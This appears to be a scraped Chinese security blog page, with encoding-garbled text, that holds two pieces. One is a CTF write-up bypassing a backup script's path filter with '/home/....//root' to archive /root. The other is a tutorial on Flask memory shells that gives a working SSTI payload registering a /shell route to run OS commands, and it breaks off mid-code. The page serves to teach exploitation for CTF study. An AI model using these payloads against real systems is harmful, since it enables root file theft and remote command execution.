<p>å†…å®¹å¤§æ¦‚ä¸ºä¸‰ä¸ªåŠŸèƒ½ï¼š<br>1.è¾“å…¥æ£€æŸ¥ï¼Œå¿…é¡»ä¼ å…¥ä¸€ä¸ª JSON æ–‡ä»¶è·¯å¾„ï¼ˆå¦‚ task.jsonï¼‰ï¼Œå¦åˆ™æŠ¥é”™ã€‚æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨ã€‚<br>2.è·¯å¾„è¿‡æ»¤ä½¿ç”¨,jq ç§»é™¤ directories_to_archive ä¸­æ‰€æœ‰ ..&#x2F;ï¼ˆé˜²æ­¢ç›®å½•éå†æ”»å‡»ï¼‰ã€‚å…è®¸çš„è·¯å¾„èŒƒå›´é™å®šåœ¨ &#x2F;var&#x2F; å’Œ &#x2F;home&#x2F;ã€‚<br>3.è·¯å¾„æƒé™æ£€æŸ¥,is_allowed_path() å‡½æ•°æ£€æŸ¥è·¯å¾„æ˜¯å¦ä»¥ &#x2F;var&#x2F; æˆ– &#x2F;home&#x2F; å¼€å¤´ï¼ˆé˜²æ­¢è®¿é—®æ•æ„Ÿè·¯å¾„å¦‚ &#x2F;root&#x2F;ï¼‰ã€‚</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">if [[ $# -ne 1 ]]; then</span><br><span class="line">    /usr/bin/echo &quot;Usage: $0 &lt;task.json&gt;&quot;</span><br><span class="line">    exit 1</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">json_file=&quot;$1&quot;</span><br><span class="line"></span><br><span class="line">if [[ ! -f &quot;$json_file&quot; ]]; then</span><br><span class="line">    /usr/bin/echo &quot;Error: File &#x27;$json_file&#x27; not found.&quot;</span><br><span class="line">    exit 1</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">allowed_paths=(&quot;/var/&quot; &quot;/home/&quot;)</span><br><span class="line"></span><br><span class="line">updated_json=$(/usr/bin/jq &#x27;.directories_to_archive |= map(gsub(&quot;\\.\\./&quot;; &quot;&quot;))&#x27; &quot;$json_file&quot;)</span><br><span class="line"></span><br><span class="line">/usr/bin/echo &quot;$updated_json&quot; &gt; &quot;$json_file&quot;</span><br><span class="line"></span><br><span class="line">directories_to_archive=$(/usr/bin/echo &quot;$updated_json&quot; | /usr/bin/jq -r &#x27;.directories_to_archive[]&#x27;)</span><br><span class="line"></span><br><span class="line">is_allowed_path() &#123;</span><br><span class="line">    local path=&quot;$1&quot;</span><br><span class="line">    for allowed_path in &quot;$&#123;allowed_paths[@]&#125;&quot;; do</span><br><span class="line">        if [[ &quot;$path&quot; == $allowed_path* ]]; then</span><br><span class="line">            return 0</span><br><span class="line">        fi</span><br><span class="line">    done</span><br><span class="line">    return 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for dir in $directories_to_archive; do</span><br><span class="line">    if ! is_allowed_path &quot;$dir&quot;; then</span><br><span class="line">        /usr/bin/echo &quot;Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed.&quot;</span><br><span class="line">        exit 1</span><br><span class="line">    fi</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">/usr/bin/backy &quot;$json_file&quot;</span><br></pre></td></tr></table></figure>

<p>task.json</p>
<p>å…¶ä¸»è¦åŠŸèƒ½æ˜¯è¿‡æ»¤è·¯å¾„å¹¶æ£€æŸ¥å…è®¸çš„ç›®å½•ï¼Œå…ˆæ‰§è¡Œä¸€ä¸‹backy.shï¼Œå‘ç°ä¼šç”Ÿæˆä¸€ä¸ªå‹ç¼©åŒ…</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;destination&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/home/martin/backups/&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;multiprocessing&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;verbose_log&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;directories_to_archive&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;/home/app-production/app&quot;</span></span><br><span class="line">        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">        <span class="attr">&quot;exclude&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;.*&quot;</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h4 id="åšæ³•ï¼š"><a href="#åšæ³•ï¼š" class="headerlink" title="åšæ³•ï¼š"></a>åšæ³•ï¼š</h4><p>å°†å¤‡ä»½ç›®å½•ä¿®æ”¹ä¸º&#x2F;home&#x2F;â€¦.&#x2F;&#x2F;root  å¹¶ä¸”è¦åˆ é™¤exclude: [â€œ.*â€]</p>
<p>ä¸ºä»€ä¹ˆè¦åˆ é™¤ï¼Ÿ<code>exclude: [&quot;.*&quot;]å¯¼è‡´/rootæ–‡ä»¶å¤¹è¢«å®Œå…¨æ’é™¤</code></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;destination&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/home/martin/backups/&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;multiprocessing&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;verbose_log&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;directories_to_archive&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;/home/....//root&quot;</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20250424172649995.png" alt="image-20250424172649995"></p>
<p><code>sudo /usr/bin/backy.sh task.json</code></p>
<p><img src="/images/image-20250424172727484.png" alt="image-20250424172727484"></p>
<p>æ‰§è¡Œ<code>ls</code> å‘ç°ç”Ÿæˆäº†å‹ç¼©åŒ… ä½¿ç”¨<code>tar -xjf code_home_.._root_2025_April.tar.bz2</code></p>
<p>å†ls å‘ç°ç”Ÿæˆäº†rootç›®å½• è¿›rootç›®å½•è¯»root.txtå³å¯</p>
<p><img src="/images/image-20250424172954271.png" alt="image-20250424172954271"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/04/20/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/2.png">
      <meta itemprop="name" content="Sauy">
      <meta itemprop="description" content="VENI,VEDI,VICI">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Sauy's corner">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/04/20/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">æµ…è°ˆpythonå†…å­˜é©¬</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2025-04-20 22:30:30" itemprop="dateCreated datePublished" datetime="2025-04-20T22:30:30+08:00">2025-04-20</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2025-04-21 09:54:16" itemprop="dateModified" datetime="2025-04-21T09:54:16+08:00">2025-04-21</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="å‰è¨€ï¼š"><a href="#å‰è¨€ï¼š" class="headerlink" title="å‰è¨€ï¼š"></a>å‰è¨€ï¼š</h2><p>æƒ³æ³•æ¥æºäºTGCTFçš„ä¸€é“é¢˜ æƒ³å…·ä½“å­¦ä¹ ä¸‹ å†…å­˜é©¬ç©¶ç«Ÿæ˜¯ä»€ä¹ˆä¸œè¥¿</p>
<h1 id="Pythonå†…å­˜é©¬"><a href="#Pythonå†…å­˜é©¬" class="headerlink" title="Pythonå†…å­˜é©¬"></a>Pythonå†…å­˜é©¬</h1><p>ä¼—æ‰€å‘¨çŸ¥ï¼Œpythonä¸‹æœ‰è®¸å¤šè½»å‹æ¡†æ¶ï¼Œæ¯”å¦‚ flask Tornado pyramidç­‰ æ¯ä¸ªæ¡†æ¶éƒ½åŸºæœ¬æœ‰å…¶å¯¹åº”çš„å†…å­˜é©¬æ³¨å…¥çš„æ–¹å¼</p>
<h2 id="Flaskå†…å­˜é©¬æ³¨å…¥"><a href="#Flaskå†…å­˜é©¬æ³¨å…¥" class="headerlink" title="Flaskå†…å­˜é©¬æ³¨å…¥"></a>Flaskå†…å­˜é©¬æ³¨å…¥</h2><p>flaskæ¡†æ¶ä¸­ä½¿ç”¨ <code>render_template_string()</code> è¿›è¡Œæ¸²æŸ“ï¼Œä½†æœªå¯¹ç”¨æˆ·ä¼ è¾“çš„ä»£ç è¿›è¡Œè¿‡æ»¤å¯¼è‡´ç”¨æˆ·å¯ä»¥é€šè¿‡æ³¨å…¥æ¶æ„ä»£ç æ¥å®ç° python å†…å­˜é©¬çš„æ³¨å…¥ã€‚</p>
<h3 id="è€ç‰ˆflaskå†…å­˜é©¬æ³¨å…¥"><a href="#è€ç‰ˆflaskå†…å­˜é©¬æ³¨å…¥" class="headerlink" title="è€ç‰ˆflaskå†…å­˜é©¬æ³¨å…¥"></a>è€ç‰ˆflaskå†…å­˜é©¬æ³¨å…¥</h3><p>å¤šå­˜åœ¨sstiçš„åœºæ™¯ä¸­ å¦‚æœæƒ³è¦åœ¨pythonä¸­å®ç°å†…å­˜é©¬ å¿…é¡»æƒ³æ˜¯å¦èƒ½åŠ¨æ€æ³¨å†Œæ–°è·¯ç”± </p>
<p>flaskæ³¨å†Œæ–°è·¯ç”±ç”¨çš„æ˜¯ <code>app.route</code> å®é™…è°ƒç”¨çš„æ˜¯add_url_ruel</p>
<h4 id="æ³¨æ„ï¼šä»ä¸‹é¢ä¸€ç›´åˆ°æ„é€ webshell-éƒ½æ˜¯å‰è¨€çŸ¥è¯†-ä¸ºäº†è®©ä½ æ›´å¥½ç†è§£-å†…å­˜é©¬çš„payload"><a href="#æ³¨æ„ï¼šä»ä¸‹é¢ä¸€ç›´åˆ°æ„é€ webshell-éƒ½æ˜¯å‰è¨€çŸ¥è¯†-ä¸ºäº†è®©ä½ æ›´å¥½ç†è§£-å†…å­˜é©¬çš„payload" class="headerlink" title="æ³¨æ„ï¼šä»ä¸‹é¢ä¸€ç›´åˆ°æ„é€ webshell éƒ½æ˜¯å‰è¨€çŸ¥è¯† ä¸ºäº†è®©ä½ æ›´å¥½ç†è§£ å†…å­˜é©¬çš„payload"></a>æ³¨æ„ï¼šä»ä¸‹é¢ä¸€ç›´åˆ°æ„é€ webshell éƒ½æ˜¯å‰è¨€çŸ¥è¯† ä¸ºäº†è®©ä½ æ›´å¥½ç†è§£ å†…å­˜é©¬çš„payload</h4><h4 id="add-url-ruelä»‹ç»"><a href="#add-url-ruelä»‹ç»" class="headerlink" title="add_url_ruelä»‹ç»"></a>add_url_ruelä»‹ç»</h4><p><code>app.add_url_rule(&#39;/index/&#39;,endpoint=&#39;index&#39;,view_func=index)</code></p>
<p>ä¸‰ä¸ªå‚æ•°ï¼š</p>
<p>url:å¿…é¡»ä»¥&#x2F;å¼€å¤´</p>
<p>endpointï¼š(ç«™ç‚¹)</p>
<p>view_funcï¼šæ–¹æ³• åªéœ€è¦å†™æ–¹æ³•åä¹Ÿå¯ä»¥ä¸ºåŒ¿åå‚æ•°ï¼‰ï¼Œå¦‚æœä½¿ç”¨æ–¹æ³•åä¸è¦åŠ æ‹¬å·ï¼ŒåŠ æ‹¬å·è¡¨ç¤ºå°†å‡½æ•°çš„è¿”å›å€¼ä¼ ç»™äº†view_funcå‚æ•°äº†ï¼Œç¨‹åºå°±ä¼šç›´æ¥æŠ¥é”™ã€‚</p>
<h4 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h4><p>é¦–å…ˆæ˜¯è¦æ·»åŠ è·¯ç”±æˆåŠŸï¼Œç„¶åç‰¹åˆ«é‡è¦çš„æ˜¯ view_funcä¸­é‡‡ç”¨åŒ¿åå‡½æ•°çš„æ–¹å¼ã€‚è¯¥å‡½æ•°è¦å®ç°æ•è·å€¼ï¼Œå‘½ä»¤æ‰§è¡Œï¼Œå“åº”ã€‚</p>
<p>å½“ä¸€ä¸ªç½‘é¡µè¯·æ±‚åï¼Œä¼šå®ä¾‹åŒ–ä¸€ä¸ªRequest Contextã€‚åœ¨pythonä¸­åˆ†å‡ºäº†ä¸¤ç§ä¸Šä¸‹æ–‡ï¼Œè¯·æ±‚ä¸Šä¸‹æ–‡(request context)å’Œåº”ç”¨ä¸Šä¸‹æ–‡(session context)ã€‚ä¸€ä¸ªè¯·æ±‚ä¸Šä¸‹æ–‡ä¸­å°è£…äº†è¯·æ±‚çš„ä¿¡æ¯ã€‚<br>è€Œä¸Šä¸‹æ–‡çš„ç»“æ„æ˜¯è¿ç”¨äº†ä¸€ä¸ªStackçš„æ ˆç»“æ„ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒæ‹¥æœ‰ä¸€ä¸ªæ ˆæ‰€æ‹¥æœ‰çš„å…¨éƒ¨ç‰¹æ€§ã€‚<br>request contextå®ä¾‹åŒ–åï¼Œå®ƒä¼šè¢«pushåˆ°æ ˆ_request_ctx_stackä¸­ï¼Œé‚£æˆ‘ä»¬å¯ä»¥é€šè¿‡è·å–æ ˆé¡¶å…ƒç´ çš„æ–¹æ³•æ¥è·å–å½“å‰çš„è¯·æ±‚ã€‚</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Request=_request_ctx_stac.top</span><br></pre></td></tr></table></figure>

<h4 id="lambadaè¡¨è¾¾å¼"><a href="#lambadaè¡¨è¾¾å¼" class="headerlink" title="lambadaè¡¨è¾¾å¼"></a><strong>lambadaè¡¨è¾¾å¼</strong></h4><p>é“¾æ¥:<a target="_blank" rel="noopener" href="https://www.runoob.com/python3/python-lambda.html">https://www.runoob.com/python3/python-lambda.html</a></p>
<h4 id="Flaskä¸Šä¸‹æ–‡ç®¡ç†æœºåˆ¶"><a href="#Flaskä¸Šä¸‹æ–‡ç®¡ç†æœºåˆ¶" class="headerlink" title="Flaskä¸Šä¸‹æ–‡ç®¡ç†æœºåˆ¶"></a><strong>Flaskä¸Šä¸‹æ–‡ç®¡ç†æœºåˆ¶</strong></h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">åœ¨ä½¿ç”¨ Flask æ¡†æ¶å®ç°åŠŸèƒ½æ¥å£çš„æ—¶å€™ï¼Œå‰ç«¯ç‚¹å‡»æŒ‰é’®å‘é€è¯·æ±‚çš„è¯·æ±‚æ–¹å¼å’Œ form è¡¨å•æäº¤ç»™åç«¯çš„æ•°æ®ï¼Œåç«¯éƒ½æ˜¯é€šè¿‡ Flask ä¸­çš„ request å¯¹è±¡æ¥è·å–çš„ã€‚</span><br><span class="line"></span><br><span class="line">åœ¨ Flask æ¡†æ¶ä¸­ï¼Œè¿™ç§ä¼ é€’æ•°æ®çš„æ–¹å¼è¢«ç§°ä¸ºä¸Šä¸‹æ–‡ç®¡ç†ï¼Œåœ¨ Flask æ¡†æ¶ä¸­æœ‰å››ä¸ªä¸Šä¸‹æ–‡ç®¡ç†å¯¹è±¡ï¼šrequest ,session,current_app å’Œ g å˜é‡ã€‚</span><br><span class="line"></span><br><span class="line">å…¶ä¸­request å’Œ session è¢«ç§°ä¸ºè¯·æ±‚ä¸Šä¸‹æ–‡,current_app å’Œ g å˜é‡è¢«ç§°ä¸ºåº”ç”¨ä¸Šä¸‹æ–‡ã€‚</span><br></pre></td></tr></table></figure>

<p>å…¶å®ä¸€å¥è¯ç†è§£å°±æ˜¯ï¼š<strong>Flask çš„ä¸Šä¸‹æ–‡æœºåˆ¶æ˜¯ä¸ºäº†è§£å†³â€œè¯·æ±‚ä¸­ç›¸å…³çš„æ•°æ®éœ€è¦åœ¨å¤šä¸ªå‡½æ•°ä¸­ä½¿ç”¨ï¼Œä½†åˆä¸æƒ³æ‰‹åŠ¨å±‚å±‚ä¼ å‚â€çš„é—®é¢˜ã€‚</strong></p>
<h4 id="è¯·æ±‚ä¸Šä¸‹æ–‡-request-context"><a href="#è¯·æ±‚ä¸Šä¸‹æ–‡-request-context" class="headerlink" title="è¯·æ±‚ä¸Šä¸‹æ–‡ (request context)"></a><em>è¯·æ±‚ä¸Šä¸‹æ–‡ (request context)</em></h4><p>Flaskä¸Šä¸‹æ–‡å¯¹è±¡ç›¸å½“äºä¸€ä¸ªå®¹å™¨ã€‚ä¿å­˜äº†Flaskç¨‹åºè¿è¡Œè¿‡ç¨‹çš„ä¸€äº›ä¿¡æ¯ï¼Œæ¯”å¦‚è¯·æ±‚æ–¹å¼å’Œè¡¨å•æ•°æ®ã€‚</p>
<p>1.request</p>
<p>åœ¨ Flask ä¸­ï¼Œrequest å¯¹è±¡å°è£…äº† HTTP è¯·æ±‚çš„å†…å®¹ï¼Œé’ˆå¯¹çš„æ˜¯ HTTP è¯·æ±‚ï¼Œä¿å­˜äº†å½“å‰è¯·æ±‚çš„ç›¸å…³æ•°æ®ã€‚</p>
<p>2.session</p>
<p>sessionå’Œcookieéƒ½æ˜¯ç”¨æ¥åšçŠ¶æ€ä¿æŒ ä½†æ˜¯cookieä¾èµ–äºæµè§ˆå™¨ï¼Œä½†æ˜¯sessionä¸éœ€è¦ã€‚</p>
<h4 id="åº”ç”¨ä¸Šä¸‹æ–‡-application-context"><a href="#åº”ç”¨ä¸Šä¸‹æ–‡-application-context" class="headerlink" title="åº”ç”¨ä¸Šä¸‹æ–‡ (application context)"></a><em>åº”ç”¨ä¸Šä¸‹æ–‡ (application context)</em></h4><p>åº”ç”¨ä¸Šä¸‹æ–‡ä¸æ˜¯ä¸€ç›´å­˜åœ¨çš„ï¼Œä»–æ˜¯ä¸´æ—¶çš„ï¼Œå‘é€è¯·æ±‚æ‰ä¼šæœ‰åº”ç”¨ä¸Šä¸‹æ–‡ï¼Œè¯·æ±‚ç»“æŸåå°±ä¼šå¤±æ•ˆã€‚</p>
<p>1.curent_app</p>
<p>current_app æ˜¯åº”ç”¨ç¨‹åºä¸Šä¸‹æ–‡ï¼Œç”¨äºå­˜å‚¨ Flask åº”ç”¨ç¨‹åº app ä¸­çš„å˜é‡ï¼Œå¯ä»¥åœ¨ current_app ä¸­å­˜å‚¨ä¸€äº›å˜é‡ã€‚</p>
<p>2.gå˜é‡</p>
<p><code>g</code> æ˜¯ <code>AppContext</code> ä¸­çš„ä¸´æ—¶å…¨å±€å˜é‡ï¼Œæ¯ä¸ªè¯·æ±‚ç‹¬ç«‹ï¼Œé€‚åˆç”¨äºå­˜å‚¨æ•°æ®åº“è¿æ¥ã€ç¼“å­˜ç­‰ä¸­é—´ä»¶èµ„æºã€‚ä¼šéšç€è¯·æ±‚çš„ç»“æŸè€Œé”€æ¯ã€‚</p>
<h4 id="æ ¸å¿ƒä¸¤ä¸ªæ ˆ"><a href="#æ ¸å¿ƒä¸¤ä¸ªæ ˆ" class="headerlink" title="æ ¸å¿ƒä¸¤ä¸ªæ ˆ"></a>æ ¸å¿ƒä¸¤ä¸ªæ ˆ</h4><table>
<thead>
<tr>
<th>ç±»å‹</th>
<th>åç§°</th>
<th>å­˜ä»€ä¹ˆ</th>
</tr>
</thead>
<tbody><tr>
<td>è¯·æ±‚ä¸Šä¸‹æ–‡æ ˆ</td>
<td><code>_request_ctx_stack</code></td>
<td>åŒ…å« <code>request</code>, <code>session</code>, <code>g</code> ç­‰</td>
</tr>
<tr>
<td>åº”ç”¨ä¸Šä¸‹æ–‡æ ˆ</td>
<td><code>_app_ctx_stack</code></td>
<td>åŒ…å« <code>current_app</code>, <code>g</code></td>
</tr>
</tbody></table>
<h4 id="evalç”¨æ³•eval-expression-globals-None-locals-None"><a href="#evalç”¨æ³•eval-expression-globals-None-locals-None" class="headerlink" title="evalç”¨æ³•eval(expression, globals&#x3D;None, locals&#x3D;None)"></a>evalç”¨æ³•eval(expression, globals&#x3D;None, locals&#x3D;None)</h4><p>expression(å¿…éœ€):pythonè¡¨è¾¾å¼ æ‰§è¡Œå¹¶è®¿é—®æ‰§è¡Œçš„ç»“æœ</p>
<p>globals(å¯é€‰):è¿™æ˜¯ä¸€ä¸ªå­—å…¸ï¼Œå®ƒæä¾›äº†æ‰§è¡Œè¡¨è¾¾å¼æ—¶å¯ç”¨çš„å…¨å±€å˜é‡ã€‚å¦‚æœæ²¡æœ‰æä¾›ï¼Œ<code>eval()</code> é»˜è®¤ä½¿ç”¨è°ƒç”¨æ—¶çš„å…¨å±€ä½œç”¨åŸŸï¼ˆå³å½“å‰ç¯å¢ƒä¸­çš„å…¨å±€å˜é‡ï¼‰</p>
<p>locals(å¯é€‰):è¿™æ˜¯ä¸€ä¸ªå­—å…¸ï¼Œè¡¨ç¤ºæ‰§è¡Œè¡¨è¾¾å¼æ—¶å¯ç”¨çš„å±€éƒ¨å˜é‡ã€‚å¦‚æœæ²¡æœ‰æä¾›ï¼Œ<code>eval()</code> é»˜è®¤ä½¿ç”¨å½“å‰ä½œç”¨åŸŸä¸­çš„å±€éƒ¨å˜é‡ã€‚</p>
<h4 id="å†…å­˜é©¬å†™æ³•"><a href="#å†…å­˜é©¬å†™æ³•" class="headerlink" title="å†…å­˜é©¬å†™æ³•"></a>å†…å­˜é©¬å†™æ³•</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](</span><br><span class="line">	<span class="string">&quot;app.add_url_rule(</span></span><br><span class="line"><span class="string">		&#x27;/shell&#x27;, </span></span><br><span class="line"><span class="string">		&#x27;shell&#x27;, </span></span><br><span class="line"><span class="string">		lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read()</span></span><br><span class="line"><span class="string">	)&quot;</span>,</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>],</span><br><span class="line">		<span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>(1)<code>url_for.__globals__[&#39;__builtins__&#39;]</code> Python ä¸­å†…ç½®çš„å…¨å±€å‡½æ•°å’Œå¯¹è±¡ï¼ŒåŒ…æ‹¬ <code>print()</code>ã€<code>eval()</code> ç­‰ã€‚é€šè¿‡è¿™ä¸€æ­¥ï¼Œä½ å¯ä»¥è®¿é—®å†…ç½®çš„ <code>eval()</code> å‡½æ•°</p>
<p>(2)<code>( 	&quot;app.add_url_rule( 		&#39;/shell&#39;,  		&#39;shell&#39;,  		lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)).read() 	)&quot;</code></p>
<p>åˆ›å»ºä¸€ä¸ªæ–°è·¯ç”± &#x2F;shell åœ¨è¿™ä¸ª&#x2F;shell è·å–è¯·æ±‚ä¸­çš„cmdå‚æ•° å¦‚æœæ²¡æœ‰æä¾›cmdå‚æ•° å°±é»˜è®¤æ‰§è¡Œwhoamiå‘½ä»¤</p>
<p>(3)<code>&#123; 		&#39;_request_ctx_stack&#39;:url_for.__globals__[&#39;_request_ctx_stack&#39;], 		&#39;app&#39;:url_for.__globals__[&#39;current_app&#39;] 	&#125;</code></p>
<p>è¿™æ˜¯evalçš„å‡½æ•°ç¬¬äºŒä¸ªå‚æ•°  å…¶å®å°±æ˜¯å­—å…¸ å…è®¸åœ¨æ‰§è¡Œè¡¨è¾¾å¼æ—¶ä½¿ç”¨ <code>Flask</code> ç‰¹æœ‰çš„å˜é‡å’Œå¯¹è±¡</p>
<p>Flask çš„ä¸Šä¸‹æ–‡ç®¡ç†ä½¿ç”¨äº†æ ˆç»“æ„ï¼Œé€šè¿‡å°† <code>_request_ctx_stack</code> å’Œ <code>app</code> æ”¾åˆ°ä¸Šä¸‹æ–‡å­—å…¸ä¸­ï¼Œ<code>eval()</code> å°±å¯ä»¥è®¿é—®åˆ°å½“å‰çš„è¯·æ±‚ä¸Šä¸‹æ–‡å’Œåº”ç”¨å¯¹è±¡ï¼Œè¿›è€Œæ‰§è¡ŒåŠ¨æ€ç”Ÿæˆçš„ä»£ç ã€‚è¿™ä½¿å¾—æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ç§æœºåˆ¶æ‰§è¡Œæ¶æ„çš„æ“ä½œï¼ˆæ¯”å¦‚æ‰§è¡Œä¼ å…¥çš„å‘½ä»¤ï¼‰ã€‚</p>
<h3 id="æ–°ç‰ˆflaskå†…å­˜é©¬æ³¨å…¥"><a href="#æ–°ç‰ˆflaskå†…å­˜é©¬æ³¨å…¥" class="headerlink" title="æ–°ç‰ˆflaskå†…å­˜é©¬æ³¨å…¥"></a>æ–°ç‰ˆflaskå†…å­˜é©¬æ³¨å…¥</h3><p>æ–°ç‰ˆå·²ç»ä¸æ”¯æŒé€šè¿‡add_url_ruleæ·»åŠ è·¯ç”±äº†ï¼Œæ‰€ä»¥è¦è€ƒè™‘ç”¨å…¶ä»–çš„æ–¹æ³•æ¥ä»£æ›¿add_url_rule ä½¿ç”¨<code>@app.before_request</code>å’Œ</p>
<h4 id="app-before-request"><a href="#app-before-request" class="headerlink" title="@app.before_request"></a>@app.before_request</h4><p>åœ¨response(å“åº”)ä¹‹å‰åšå“åº”</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> redirect</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> session</span><br><span class="line"> </span><br><span class="line">app = Flask(__name__)  <span 